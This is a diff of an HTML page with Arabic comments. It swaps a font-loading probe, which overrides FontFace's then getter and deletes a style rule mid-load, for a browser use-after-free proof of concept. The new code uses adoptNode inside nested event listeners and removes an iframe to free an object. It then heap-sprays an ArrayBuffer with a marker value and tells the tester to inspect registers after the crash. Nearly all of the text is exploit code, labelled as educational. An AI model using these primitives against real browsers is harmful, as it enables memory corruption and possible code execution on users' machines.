@@ -1,91 +1,37 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>بيئة الفحص الآمنة والمستقرة</title>
-    <style>
-        body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
-        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
-        .log { margin-bottom: 8px; }
-        .warn { color: #ffaa00; }
-        .success { color: #00ff00; font-weight: bold; }
-    </style>
-    
-    <style id="s">
-        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
-    </style>
-</head>
 <body>
-
-    <h2>مراقبة مسار معالجة الخطوط - النسخة المستقرة</h2>
-    <div id="custom-console">[نظام المحاكاة]: في انتظار استقرار المستند...</div>
+    <h3>تجربة التعليمية: اختبار تسريب الذاكرة (Memory Leak Primitive)</h3>
+    <button onclick="testMemoryLeak()">ابدأ فحص الذاكرة</button>
+    <div id="result"></div>
 
     <script>
-        const consoleElement = document.getElementById('custom-console');
-        
-        function screenLog(msg, type = "normal") {
-            const entry = document.createElement('div');
-            if (type === "warn") entry.className = 'log warn';
-            else if (type === "success") entry.className = 'log success';
-            else entry.className = 'log';
-            entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            consoleElement.appendChild(entry);
-            consoleElement.scrollTop = consoleElement.scrollHeight;
+        function testMemoryLeak() {
+            const f = document.body.appendChild(document.createElement('iframe'));
+            const a = document.createElement('div');
+            const b = a.appendChild(document.createElement('div'));
+
+            // الخطوة 1: حقن مستمع الحدث الذي سيحفز الـ UAF
+            a.addEventListener('a', () => {
+                document.adoptNode(a);
+                f.remove();
+                
+                // محاولة تخصيص ذاكرة جديدة فور تحرير الكائن القديم
+                // هذا يسمى "Heap Spraying" لمحاولة أخذ مكان الكائن المحرر
+                window.spray = new ArrayBuffer(0x1000);
+                let view = new Uint32Array(window.spray);
+                view[0] = 0x42424242; // نضع نمطاً مميزاً للبحث عنه
+            });
+
+            b.addEventListener('a', () => {
+                f.contentDocument.adoptNode(a);
+            });
+
+            // الخطوة 2: تحفيز الانهيار
+            b.dispatchEvent(new Event('a', { bubbles: true }));
+            
+            document.getElementById('result').innerText = "تمت محاولة التخصيص. تحقق من الـ Regs في حالة الانهيار.";
         }
-
-        function runSafeAnalysis() {
-            consoleElement.innerHTML = "";
-            screenLog("بدء تشغيل الفحص الآمن (منع الجمود)...");
-
-            try {
-                // إعداد كائن الخط الأساسي
-                let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-                document.fonts.add(A);
-                void A.loaded;
-
-                let fired = false;
-
-                // إعداد المقاطعة الآمنة
-                Object.defineProperty(FontFace.prototype, 'then', {
-                    configurable: true,
-                    get() {
-                        if (!fired && this === A) {
-                            fired = true;
-                            screenLog("!! تم تفعيل المقاطعة بنجاح !!", "warn");
-                            
-                            // حل مشكلة الجمود: تأجيل الحذف إلى الدورة التالية للـ Event Loop
-                            setTimeout(() => {
-                                try {
-                                    document.getElementById('s').sheet.deleteRule(0);
-                                    screenLog("تم حذف القاعدة التنسيقية بأمان بعد استقرار المسار الطبيعي.");
-                                } catch(e) { 
-                                    screenLog("خطأ أثناء الحذف: " + e.message, "warn"); 
-                                }
-                            }, 0);
-
-                            // تتبع الحالة بعد مهلة قصيرة
-                            setTimeout(() => {
-                                let offset = document.body.offsetTop;
-                                screenLog(`التحقق النهائي - حالة الخط: ${A.status} | الـ Offset: ${offset}`, "success");
-                            }, 50);
-                        }
-                        return function(resolve) { if (resolve) resolve(); };
-                    }
-                });
-
-                screenLog("إرسال طلب التحميل إلى الـ Layout Pipeline...");
-                document.fonts.load('1em x', 'AB');
-
-            } catch (err) {
-                screenLog("خطأ عام في النظام: " + err.message, "warn");
-            }
-        }
-
-        // تشغيل الكود بعد التأكد من تحميل الصفحة بالكامل
-        window.onload = () => {
-            screenLog("تم تحميل المستند. جاري الانتظار للاستقرار البدئي...");
-            setTimeout(runSafeAnalysis, 1000);
-        };
     </script>
 </body>
 </html>
